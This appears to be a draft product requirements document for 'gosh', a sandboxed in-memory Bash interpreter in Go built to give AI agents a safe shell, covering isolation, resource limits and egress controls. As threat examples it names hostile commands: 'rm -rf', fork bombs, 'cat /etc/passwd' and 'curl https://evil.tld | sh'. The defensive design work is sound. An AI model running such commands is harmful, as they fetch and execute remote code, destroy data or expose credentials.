# gosh — Product Requirements Document

> A sandboxed, in-memory Bash interpreter for Go, built for AI agents.

| | |
|---|---|
| **Status** | Draft v0.1 |
| **Owner** | @darylcecile |
| **Last updated** | 2026-06-07 |
| **Module path (proposed)** | `github.com/darylcecile/gosh` |

---

## 1. Summary

`gosh` is a Go library that executes Bash scripts inside a fully virtualised,
in-memory environment. No real process is ever spawned, no real file is ever
touched unless the host explicitly opts in. It is the Go counterpart to
[`just-bash`](https://github.com/vercel-labs/just-bash) (TypeScript), designed
from the ground up for the three properties that matter when an LLM is the one
writing the script:

1. **Security first** — untrusted, model-generated script text must never reach
   dynamic host-code evaluation or native process execution, and must not touch
   the host OS, filesystem, or network except through capabilities the host
   explicitly granted.
2. **Developer experience** — embedding `gosh` in a Go agent should take a few
   lines, with sane defaults, typed errors, and zero surprising footguns.
3. **Extensibility** — adding a custom command, mounting a custom filesystem,
   or injecting a host capability should be a small, well-documented interface
   implementation.

> [!NOTE]
> This document defines *what* we build and *why*. Implementation phasing and
> the concrete, checkable task list live in [`FEATURES.md`](./FEATURES.md).

---

## 2. Background & motivation

AI agents increasingly need a "computer use" capability: a shell they can drive
to read files, transform data, and chain Unix tools. Handing a model a real
`bash` over `os/exec` is dangerous — a single `rm -rf`, `curl | sh`, fork bomb,
or `cat /etc/passwd` is catastrophic. Containers and microVMs solve this but add
operational weight, cold-start latency, and infrastructure cost that is
disproportionate for "let the agent grep a JSON file".

`just-bash` proved the model: a re-implemented shell + in-memory filesystem +
re-implemented coreutils gives agents ~90% of the practical usefulness of a real
shell with a fraction of the attack surface, in-process and instant. `gosh`
brings that to the Go ecosystem, where it can be embedded directly into Go-based
agent frameworks, MCP servers, and backend services without a Node runtime.

### Why Go changes the threat calculus (in our favour)

`just-bash`'s single largest residual-risk category is **JS engine escape** —
because it runs in-process with the host JavaScript VM, an attacker who reaches
JS execution can attempt prototype pollution, `Function` reconstruction, or
`import('data:...')` breakouts. Its threat model devotes an entire defense layer
(blocked globals, frozen `Reflect`, worker boxing) to this. ([just-bash
THREAT_MODEL.md §3.5, §4.1–4.10](https://github.com/vercel-labs/just-bash/blob/main/THREAT_MODEL.md))

In Go this *escape* class largely **does not exist**: there is no `eval`, no
prototype chain, and **no intended path from interpreting Bash text to dynamic
host-code evaluation or native process execution**. Script text is data; it can
only exercise the audited interpreter paths and the Go builtins/capabilities we
explicitly register.

> [!IMPORTANT]
> This is narrower than "Bash text never runs Go code." It obviously does —
> the interpreter, expansion/glob/arithmetic logic, every builtin, the FS
> handlers, regex and archive parsers are all Go. Those paths are our **trusted
> computing base (TCB)** and a bug in any of them is in-scope (see §6, §16). The
> guarantee we protect is: *no dynamic Go eval, no prototype-style escape, and
> no native process execution* reachable from a script.

This is `gosh`'s structural advantage and the primary boundary we defend.

The flip side: Go's stock shell library, [`mvdan.cc/sh`](https://pkg.go.dev/mvdan.cc/sh/v3/interp),
defaults to the *opposite* of a sandbox — it shells out via `os/exec` and reads
the real filesystem. Our job is to invert every one of those defaults.

---

## 3. Goals & non-goals

### 3.1 Goals

- **G1** — Execute a useful subset of Bash (pipes, redirections, `&&`/`||`/`;`,
  variables, parameter expansion, globbing, conditionals, loops, functions,
  heredocs, arithmetic) with behaviour matching real Bash closely enough that
  models are not surprised.
- **G2** — Ship a library of pure-Go re-implemented Unix commands (target: the
  ~70 that `just-bash` provides) so scripts never need a real binary.
- **G3** — Default-deny posture: no real FS, no network, no subprocess, no env
  leakage, no clock/timezone leakage — all opt-in via explicit configuration.
- **G4** — Hard resource governance: bounded CPU (via deadlines), command count,
  loop iterations, output size, memory growth, and recursion depth.
- **G5** — A clean, idiomatic, `context`-aware Go API that is pleasant to embed
  and hard to misuse.
- **G6** — A first-class extension API for custom commands and custom/mounted
  filesystems.
- **G7** — Ergonomic surfaces for agents specifically: structured results,
  optional JSON output, a ready-to-wrap CLI, and a documented MCP/tool adapter.

### 3.2 Non-goals (for v1)

- **NG1** — Being a 100%-faithful Bash. We target the script patterns agents
  actually emit, not POSIX certification or interactive-shell fidelity (job
  control, `&` background jobs, ttys, line editing).
- **NG2** — Running arbitrary native binaries. If you need real binaries, you
  need a real sandbox (container / microVM); `gosh` is explicitly *not* that and
  will say so.
- **NG3** — Bundled language runtimes (Python/JS/SQLite WASM) in v1. The
  extension API must make these *possible* to add, but they are post-v1 and
  off-by-default (they are a large new attack surface — see §6.7).
- **NG4** — Being a security boundary against a hostile *host integrator*. The
  host embedding `gosh` is trusted; we defend against the *script* and against
  *malicious data the script ingests*, not against the Go program that linked us.
- **NG5** — Multi-tenant isolation guarantees equivalent to a kernel/hypervisor.
  In-process means a panic or pathological allocation can affect the host
  process; we mitigate but do not eliminate this (see §6.8, Residual risk).

---

## 4. Personas & use cases

| Persona | Need | `gosh` answer |
|---|---|---|
| **Agent framework author** | Give an LLM a `bash` tool that can't hurt the host | Embed `gosh`, expose `Run` as a tool, default-deny everything |
| **Backend engineer** | Run user-submitted data-transform scripts safely | In-memory FS seeded with input, capture stdout, discard the rest |
| **MCP server author** | Offer a sandboxed shell tool over MCP | Wrap the CLI/adapter, stream structured results |
| **Library extender** | Add a domain command (e.g. `myapi`) the model can call | Implement the `Command` interface, register it |
| **Local dev / debugging** | Try scripts without risk; reproduce agent behaviour | `gosh` CLI with an overlay FS over the cwd |

### Representative scenarios

- "Count the users in `/data/users.json`" → seed file, run `jq 'length'`,
  return stdout.
- "Find every TODO under `src/`" → mount cwd read-only, run `grep -r TODO src/`.
- Model emits `while true; do :; done` → killed by loop/command/time governor
  with a clear, model-readable error.
- Model emits `curl https://evil.tld | sh` → `curl` absent (network off) *and*
  no path from text to host execution; script fails safely.

---

## 5. Product principles

1. **Secure by default, dangerous by opt-in.** Every capability that widens the
   attack surface (real FS, network, archive extraction, runtimes) is off until
   the host explicitly enables it, and each carries a loud doc warning.
2. **The script is untrusted; the integrator is trusted.** This single sentence
   resolves most design debates (see NG4).
3. **Fail loud, fail readable.** Errors are typed for the host and
   human/model-readable in output. A hit limit names the limit it hit.
4. **No ambient authority.** A command receives only the capabilities passed in
   its context — FS, env, stdin, a scoped `exec`. It cannot reach package-level
   globals for I/O, time, or network.
5. **Determinism where it aids safety.** Default UTC clock, stable glob
   ordering, no host env inheritance — so output doesn't leak host state and
   tests are reproducible.
6. **Small surface, sharp edges documented.** Prefer a few composable
   interfaces over many options; document the residual risks honestly.

---

## 6. Security requirements (the core of the product)

> This section is normative. Anything marked **MUST** is a release blocker.

### 6.1 Isolation invariants (MUST)

- **S1 — Fail-closed runner construction.** The `interp.Runner` is **only**
  constructed via an internal `newSecureRunner` that sets *every* option
  explicitly (empty env, virtual dir, VFS open/stat/readdir handlers,
  registry-only exec, explicit stdio, non-interactive). `interp.New`'s
  defaults inherit `os.Environ` and the real FS/exec, so a single omitted
  option silently breaks the sandbox. A unit test asserts no option falls back
  to an `mvdan/sh` default.
- **S2 — Command admission is gated *before* exec, covering builtins.**
  Overriding `ExecHandlers` is **not sufficient**: `mvdan/sh` runs shell
  functions and its own builtins (`source`, `cd`, `read`, `trap`, `command`,
  `type`, `eval`, `printf`, …) *without* calling the exec handler. We therefore
  add a `CallHandler`/admission layer that consults an explicit allow/deny
  policy for **every** command — builtin or external — and denies anything not
  on the allow-list. Unknown external command → `127`. A denied builtin (e.g.
  `eval`, `source` when disabled) is rejected even though `interp.IsBuiltin`
  returns true. Tests prove disabled builtins cannot run.
- **S2a — Unsupported constructs are rejected, not just undocumented.** An AST
  validation pass runs **before** `Runner.Run` and hard-rejects constructs we
  do not safely model: background jobs `&`, process substitution `<(...)`
  (which can create real named pipes outside `OpenHandler`), coprocs, and any
  redirect to special FD/host paths we don't support. Rejection is a clean
  typed `UnsupportedError`, with a red-team test per construct.
- **S2b — Registry-only execution.** With S1–S2a in place, the only code a
  script can invoke is a registered builtin or an admitted shell function —
  never `os/exec`, never a real binary.
- **S3 — Default in-memory FS** with no host backing (see §6.2).
- Enforcement is layered: (a) the admission/AST policy above, (b) a CI
  import-allow-list banning `os`/`net`/`os/exec` in the interpreter and command
  packages (S27), and (c) **runtime poison-handler tests** — fake handlers that
  fail on *any* host FS/exec/net access, run against an escape-script corpus
  (§16), so a regression fails closed loudly.

### 6.2 Filesystem safety (MUST)

- **S4 — Path confinement.** All paths are resolved against a virtual root.
  `..`, absolute paths, and symlink targets are normalised and re-checked so
  they cannot escape a mount's boundary (defends path traversal / "zip-slip"
  style escapes).
- **S5 — Symlink loop & depth bounds.** Symlink resolution has a max hop count;
  cycles are detected and error out rather than hang.
- **S6 — Opt-in real FS adapters.** `ReadOnlyFS` and `OverlayFS` (copy-on-write,
  reads from disk / writes in memory) are off by default and are the **only**
  real-FS adapters in v1. A true `ReadWriteFS` (writes hit the host disk) is
  **deferred to post-v1** behind a dedicated design — guaranteeing
  write-confinement against host symlinks, hardlinks, TOCTOU races, Windows
  drive/UNC paths, and case-insensitive collisions is hard and not worth
  blocking v1. All adapters use POSIX virtual-path semantics (`path.Clean`),
  reject Windows drive/UNC forms, and do not follow host symlinks by default.
  Docs warn never to mount over trusted code.
- **S7 — Per-file and total VFS size caps** prevent an in-memory FS from being
  used to exhaust host memory.

### 6.3 Resource governance / DoS (MUST)

Go has **no per-goroutine memory or CPU limit**; a real sandbox would use
cgroups/containers ([general Go sandboxing guidance]). In-process we approximate
with cooperative governors, all configurable with safe defaults:

- **S8** — Wall-clock deadline via `context.Context` (cancellation checked at
  every statement boundary and inside long-running builtin loops).
- **S9** — Max total command count.
- **S10** — Max iterations per loop (`for`/`while`/`until`).
- **S11** — Max function-call / recursion depth.
- **S12** — Max cumulative output bytes (stdout+stderr) per run, with truncation
  + a typed "output limit exceeded" signal.
- **S13** — Max iterations inside regex/stream builtins (`awk`, `sed`, `grep`)
  to bound pathological inputs.
- **S14 — Memory growth guard.** Best-effort accounting of VFS + buffer
  allocation against a ceiling; exceed → abort run. (Documented as best-effort,
  not a hard kernel limit — see §6.8.)
- **S14a — Pre-execution & expansion-time bounds.** Command/loop counts don't
  cover blowups that happen *before or during* a single command. We also cap:
  input script bytes; AST node count and nesting depth (reject huge/deeply
  nested scripts at parse time); max argv + env byte size; max expanded word
  count/bytes (brace/glob/parameter expansion); max glob matches and max VFS
  directory entries scanned per glob; max pipeline length; and max command-
  substitution nesting depth. Each has a safe default and a typed limit error.

### 6.4 Regex / parser safety (MUST)

- **S15** — Builtins use Go's `regexp` (RE2, linear-time — immune to classic
  catastrophic-backtracking ReDoS). Any feature requiring backtracking is either
  unsupported or guarded by iteration caps (S13).
- **S16** — The parser (delegated to `mvdan/sh/syntax`) is fuzzed for panics on
  malformed input; a parse error is a clean typed error, never a panic that
  escapes `Run`.

### 6.5 Network egress (MUST when enabled; off by default)

- **S17** — `curl`/HTTP commands exist **only** when network is configured;
  otherwise they are `command not found`.
- **S18** — Allow-list by exact origin (scheme+host+port) **and** path prefix.
- **S19** — Method allow-list (default `GET`,`HEAD`).
- **S20** — Redirects re-validated against the allow-list on every hop;
  credentials/`Authorization` headers are **stripped on cross-origin redirects**
  and never forwarded to a non-transform host.
- **S21 — Credential injection at the egress boundary.** Secrets are attached by
  the host via header transforms *outside* the sandbox, are never present in
  script-visible env, and **override any user-supplied header of the same name**
  so a script cannot substitute or capture them.
- **S22 — SSRF hardening.** Deny by default. Even with the allow-list: resolve
  and re-check the **target IP** (deny private/loopback/link-local and cloud
  metadata `169.254.169.254` unless explicitly allowed), defend DNS rebinding
  (pin resolved IP for the request, or re-resolve+re-check), and cap response
  bytes + per-request timeout (decompression-bomb defense, reusing S7-style
  caps). "Full internet access" is a separate, loudly-warned dangerous flag.

### 6.6 Information-disclosure hygiene (MUST)

- **S23** — No host env inheritance. The script env is exactly what the host
  passes.
- **S24** — Clock defaults to **UTC** (timezone never leaked; `TZ` opt-in). Wall-
  clock *time itself* is still host state; `WithClock` lets the host inject a
  fixed/virtual clock for full determinism, and `sleep` advances virtual time
  rather than blocking. `date`/`time`/`sleep` all read the injected clock.
- **S25** — Error messages returned in script output must not embed host paths,
  Go stack traces, or internal addresses. A single script-visible error renderer
  normalises *all* errors — including wrapped `os.PathError`, parser, archive,
  and third-party-lib (JSON/YAML) errors — to virtual paths + clean statuses.
  Rich internal errors go to the host via typed Go errors. Tested with poisoned
  host paths.

### 6.7 Optional runtimes (post-v1, off by default)

- **S26** — If/when Python/JS/SQLite (WASM, e.g. via `wazero`) land, they are
  separate, explicitly-enabled modules with their own deadlines, memory caps,
  and no FS/network access except a mediated bridge. Treated as a distinct,
  larger attack surface (mirrors `just-bash`'s opt-in stance).

### 6.8 Documented residual risks (MUST document)

- In-process execution means a host-process panic or extreme allocation *can*
  affect the host; governors are cooperative, not hardware-enforced. For
  hostile multi-tenant workloads, run `gosh` itself inside an OS sandbox.
- Memory/CPU governance is best-effort.
- We ship a `THREAT_MODEL.md` enumerating actors (untrusted script author,
  malicious data source, compromised dependency), trust boundaries, attack
  surface inventory, and residual risks — structured after `just-bash`'s.

### 6.9 Supply chain (MUST)

- **S27** — Minimal, audited dependency set (ideally `mvdan/sh` + stdlib).
  `govulncheck`, `go vet`, and an import-allow-list run in CI.

---

## 7. Functional requirements — shell language

Target behaviour: **Bash dialect** via `mvdan/sh/syntax` (`LangBash`).

- **F1** Pipes `a | b`, redirections `>`, `>>`, `2>`, `2>&1`, `<`, here-docs
  `<<EOF` / `<<-EOF`, here-strings `<<<`.
- **F2** Lists & chaining `;`, `&&`, `||`, grouping `( )`, `{ }`.
- **F3** Variables, `${VAR}`, defaults `${VAR:-x}`, `${VAR:=x}`, `${#VAR}`,
  substring/replace expansions; positional params `$1`,`$@`,`$#`,`$*`.
- **F4** Command substitution `$(...)` / backticks; arithmetic `$(( ))`,
  `let`, `(( ))`.
- **F5** Globbing `*`, `?`, `[...]`; optional `extglob`/`globstar` documented.
- **F6** Conditionals `if/elif/else/fi`, `case`, `test`/`[ ]`/`[[ ]]`.
- **F7** Loops `for`, `while`, `until`, `break`/`continue` (bounded by S10).
- **F8** Functions (`name() { }` / `function name { }`), `local`, `return`.
- **F9** Builtins: `cd`, `pwd`, `export`, `unset`, `set`/`set -e`, `echo`,
  `printf`, `read`, `exit`, `true`/`false`, `:`, `alias`/`unalias`, `type`,
  `which`, `source`/`.`, `trap` (modelled within the virtual process).
- **F10** Exit-code propagation, `$?`, pipefail semantics (`set -o pipefail`).
- **F11** Cooperative cancellation: a cancelled context stops at the next
  statement boundary with a typed error and a non-zero exit code.

Explicit v1 **out of scope and actively rejected** at the AST-validation pass
(S2a), not merely undocumented: background jobs `&`, job control, process
substitution `<(...)`, coprocs, real signals/ttys, `wait`. A script using these
gets a clean `UnsupportedError`, never partial/unsafe execution.

---

## 8. Functional requirements — command library

Re-implemented in pure Go, `--help` on every command, behaviour matched to
GNU/BSD where models expect it. Full parity target = `just-bash`'s ~70 commands,
but staged: `awk`, `sed`, `jq`, `yq` are effectively *languages* and `tar`/`curl`
carry the biggest security surface, so they are **not all v1**.

**v1 "agent MVP" set** (covers the vast majority of agent scripts):

- **File ops:** `cat`, `cp`, `mv`, `rm`, `rmdir`, `mkdir`, `ls`, `ln`,
  `readlink`, `stat`, `touch`, `tree`, `file`.
- **Text:** `grep`/`egrep`/`fgrep`, `cut`, `tr`, `sort`, `uniq`, `wc`, `head`,
  `tail`, `tac`, `rev`, `nl`, `paste`, `printf`, `diff`, `strings`, `xargs`,
  `base64`, `md5sum`/`sha1sum`/`sha256sum`.
- **Data:** `jq` (JSON) — subset or an audited pure-Go lib (OQ3).
- **Nav/env:** `basename`, `dirname`, `find` (no `-exec`), `du`, `env`,
  `printenv`, `export`, `pwd`, `cd`, `tee`, `echo`.
- **Shell utils:** `date` (virtual clock), `seq`, `expr`, `sleep` (virtual time),
  `timeout`, `whoami`, `hostname`, `help`.

**Deferred to post-MVP / gated modules** (each is a milestone of its own):

- **`awk`, `sed`** — full-parity language implementations (iteration-capped, S13).
- **`yq` (YAML/TOML), CSV tool** — wrap audited Go libs (OQ3).
- **Text extras:** `join`, `comm`, `column`, `fold`, `expand`/`unexpand`, `od`.
- **Compression/archive (opt-in, bomb-guarded):** `gzip`/`gunzip`/`zcat`, `tar`.
  Extraction enforces per-entry + total size caps and path confinement (S4/S7)
  to defend decompression bombs and traversal.
- **Network (network-gated):** `curl` and an HTML→text/markdown helper.

Each command has a **conformance test** against documented behaviour; a subset
is differentially tested against real GNU tools in CI where feasible.

---

## 9. Developer experience requirements

DX is a first-class product goal, not a nicety.

- **D1 — Minimal happy path.** Embedding is ~3 lines:
  ```go
  sh := gosh.New() // secure defaults: in-memory FS, no net, no exec, limits on
  res, err := sh.Run(ctx, `echo "hi" > f.txt && cat f.txt`)
  fmt.Println(res.Stdout) // "hi\n"
  ```
- **D2 — Structured result.** `Run` returns a `Result{Stdout, Stderr, ExitCode,
  Metadata}` plus a Go `error` reserved for *host-level* failures (limit hit,
  cancelled, internal) — distinct from a non-zero script exit code.
- **D3 — Functional-options config**, all with safe defaults:
  `gosh.New(gosh.WithFiles(...), gosh.WithEnv(...), gosh.WithLimits(...),
  gosh.WithFS(...), gosh.WithNetwork(...), gosh.WithCommands(...))`.
- **D4 — Per-run overrides:** `sh.Run(ctx, script, gosh.RunEnv{...},
  gosh.RunStdin(...), gosh.RunArgs(...))` without mutating the instance.
- **D5 — FS persistence is explicit, not accidental.** Default: each `*Shell`
  owns one VFS that persists across its `Run` calls while env/functions/cwd
  reset per call (matches `just-bash`; least surprise for a single agent
  session). But cross-task data bleed is a real footgun, so we provide
  `Snapshot()`/`Reset()` and a `WithEphemeralFS` option (fresh FS per `Run`).
  The chosen default and the rationale are documented prominently.
- **D6 — `io.Reader`/`io.Writer` streaming** for stdin/stdout/stderr, so large
  output can stream instead of buffering (still bounded by S12).
- **D7 — Typed, inspectable errors:** `LimitError{Kind, Limit}`,
  `ParseError`, `UnsupportedError`, `CanceledError`, etc., via `errors.As`.
- **D8 — Context-native:** every `Run`/`exec` takes `ctx`; deadlines and
  cancellation Just Work.
- **D9 — Concurrency contract (decide before API freeze, OQ2).** A single
  `*Shell` is **not** safe for concurrent `Run` calls; the documented model is
  one `*Shell` per agent/session (cheap to construct). We will either keep that
  contract or add internal synchronisation — but the contract ships explicit and
  tested with `-race`, never left as "TBD".
- **D10 — Great docs:** GoDoc on every exported symbol, a runnable `examples/`
  dir, an `AGENTS.md` with model-facing usage guidance, and a README quick start.
- **D11 — Thoughtful defaults table** published so integrators know exactly what
  is on/off without reading code.

---

## 10. Extensibility requirements

- **E1 — `Command` interface.** A custom command is a small struct implementing
  one method, receiving a capability-scoped context:
  ```go
  type Command interface {
      // Name + aliases via metadata; Run gets argv and a scoped context.
      Run(ctx context.Context, cc *CommandContext) (exitCode int, err error)
  }
  // CommandContext exposes: Args, FS, Cwd, Env, Stdin (io.Reader),
  // Stdout/Stderr (io.Writer), and Exec (run a sub-command in the same world).
  ```
  Helpers: `gosh.CommandFunc("name", func(...))` for the common case.
- **E2 — Registration** via `WithCommands(...)`; custom commands compose in
  pipes/redirections exactly like builtins.
  > [!WARNING]
  > A custom command is **arbitrary trusted Go code**. It can import `os`/`net`,
  > spawn goroutines, or ignore limits — `CommandContext` *offers* a safe,
  > capability-scoped path (governed FS, bounded writers, context-aware `Exec`)
  > but cannot *force* a misbehaving plugin to stay in bounds. `gosh` sandboxes
  > the *script*, **not** third-party Go extensions. Treat command authors as
  > part of your TCB; this is stated plainly in the docs and threat model.
- **E3 — `FileSystem` interface** so hosts can mount custom backends
  (read-only knowledge base, object store, overlay). A `MountableFS` composes
  multiple backends at different paths into one namespace (mirrors `just-bash`).
- **E4 — Capability injection** (e.g. a host "tool" bridge a command can call)
  passed through `CommandContext`, never via globals — preserving No Ambient
  Authority (principle 4).
- **E5 — AST hooks (post-v1).** A transform/inspection pass over the parsed AST
  (`mvdan/sh/syntax`) for instrumentation, command extraction, or policy
  rewriting before execution.
- **E6 — Stability:** extension interfaces are versioned and changes follow
  semver; breaking an extension interface is a major bump.

---

## 11. Architecture overview

```
                ┌────────────────────────────────────────────┐
   script text  │                  gosh.Shell                 │
  ────────────► │  (config, limits, registry, FS, governors)  │
                └───────────────┬────────────────────────────┘
                                │
                 ┌──────────────▼───────────────┐
                 │   mvdan/sh syntax.Parser      │  parse → AST
                 └──────────────┬───────────────┘
                                │
                 ┌──────────────▼───────────────┐   handlers overridden:
                 │   mvdan/sh interp.Runner      │   ExecHandlers  → registry only
                 │   (driven, never default)     │   OpenHandler   → VFS
                 └───┬───────────┬───────────┬───┘   StatHandler   → VFS
                     │           │           │       ReadDirHandler2→ VFS
        ┌────────────▼┐  ┌───────▼──────┐  ┌─▼──────────────┐
        │ Command      │  │ Virtual FS   │  │ Resource       │
        │ Registry     │  │ (InMemory/   │  │ Governor       │
        │ (builtins +  │  │  Overlay/RO/ │  │ (deadline,     │
        │  custom)     │  │  Mountable)  │  │  counts, size) │
        └──────────────┘  └──────────────┘  └────────────────┘
                     │
            ┌────────▼─────────┐  (gated, off by default)
            │ Network egress    │
            │ (allow-list curl) │
            └───────────────────┘
```

**Key decision — build on `mvdan.cc/sh/v3`.** It is the de-facto, battle-tested,
fuzzed Go shell parser+interpreter and exposes exactly the handler seams we need
(`ExecHandlers`, `OpenHandler`, `StatHandler`, `ReadDirHandler2`, `CallHandler`,
`Env`, `Dir`, `Subshell`). Re-implementing a Bash parser would be a large,
ongoing security liability. We **invert its defaults** (no real exec, no real
FS) rather than write our own engine.
([interp API](https://pkg.go.dev/mvdan.cc/sh/v3/interp))

**Tradeoff — promoted to a release blocker (OQ1).** How much of `mvdan/sh`'s
*own* builtin set (some of which can touch the real FS/exec, and all of which
bypass `ExecHandlers`) we keep vs. shadow/deny. Default stance: **deny-by-
default builtin admission** (S2). This requires a **"mvdan seam audit"** — a
milestone that enumerates *every* interpreter path that can reach OS/env/time/
processes (builtins, `source`, glob, tilde expansion, command substitution,
subshells, redirects, here-doc temp handling, process substitution, default
env/dir/stdio) and maps each to a `gosh` override or an explicit rejection, with
fail-closed poison-handler tests for each.

---

## 12. Milestones

| Milestone | Theme | Exit criteria |
|---|---|---|
| **M0 — Spike + seam audit** | Prove the inversion *and* map the attack surface | `mvdan/sh` wired via `newSecureRunner` (S1) with VFS + builtin-admission (S2) + AST rejection of unsupported constructs (S2a); `echo`,`cat`,pipe,redirect work; **mvdan seam audit** documented; core escape corpus (host env, `/etc/passwd`, `/dev/*`, glob real cwd, `source`, command-substitution, builtin bypass, background `&`, process substitution) all fail closed |
| **M1 — Secure core** | Isolation + governors | S1–S16, S23–S25 met; in-memory VFS w/ confinement & symlink bounds; deadline/count/loop/output/recursion + expansion-time (S14a) limits; typed errors; fuzz + poison-handler harness in CI |
| **M2 — Command MVP** | Useful shell | v1 "agent MVP" command set (§8) + core shell language, conformance tests; DX API (D1–D9) stabilised & `-race` tested |
| **M3 — Extensibility** | Open it up | `Command` + `FileSystem` interfaces public, `MountableFS`, overlay/RO adapters (no `ReadWriteFS`), examples |
| **M4 — Agent surfaces** | Ship to agents | CLI (`-c`, `--json`, overlay-over-cwd), MCP/tool adapter, `AGENTS.md`, `THREAT_MODEL.md` |
| **M5 — Hardening & 1.0** | Trust | Deferred commands (`awk`/`sed`/`yq`), archive + network commands w/ bomb/SSRF/allow-list guards, differential tests vs GNU, `govulncheck`/fuzz green, docs complete, semver 1.0 |
| **Post-1.0** | Runtimes | Opt-in WASM Python/JS/SQLite via `wazero`; AST transform hooks; `ReadWriteFS` (dedicated design) |

---

## 13. Success metrics

- **Security:** zero escapes in the red-team/fuzz suite; 100% of S-requirements
  with tests; published threat model.
- **Adoption/DX:** "embed in <10 min" verified by a fresh-eyes test; >90% GoDoc
  coverage on exports; example agent runs end-to-end.
- **Capability:** v1 covers the "agent MVP" command set; `just-bash` parity by
  1.0. Measured by agent task-completion on a benchmark of representative scripts.
- **Performance:** sub-millisecond shell construction; typical script latency
  dominated by work, not setup; no real cold-start.

---

## 14. Open questions

- **OQ1 (release-blocking)** — The exact `mvdan/sh` builtin allow/deny list and
  the seam-audit findings (see §11/§12, M0). Resolved by the seam audit, not left
  open to v1.
- **OQ2** — Concurrency model for `*Shell` (reusable-but-not-reentrant vs.
  one-shot vs. internally synchronised) — pick the least surprising (D9).
- **OQ3** — `jq`/`yq`/CSV: re-implement vs. wrap an audited pure-Go lib (license,
  maintenance, attack-surface review needed per dependency).
- **OQ4** — Memory governance fidelity — how hard can S14 be made in-process
  before we just say "wrap us in a cgroup"?
- **OQ5** — Glob ordering & locale: lock to deterministic byte order? (leans yes,
  per principle 5).
- **OQ6** — License (`just-bash` is Apache-2.0; align or choose MIT?).

---

## 15. References

- just-bash (TypeScript reference impl): <https://github.com/vercel-labs/just-bash>
  — package README (command set, config, FS adapters, network model, limits) and
  `THREAT_MODEL.md` (actors, attack-surface inventory, residual risks).
- `mvdan.cc/sh/v3` parser+interpreter:
  <https://pkg.go.dev/mvdan.cc/sh/v3/interp> and
  <https://pkg.go.dev/mvdan.cc/sh/v3/syntax>.
- Go `regexp` (RE2, linear-time / ReDoS-resistant):
  <https://pkg.go.dev/regexp>.
- Decompression-bomb / zip-slip / path-traversal mitigations: `io.LimitReader`,
  `filepath.Clean` confinement, per-entry size caps (general Go guidance).
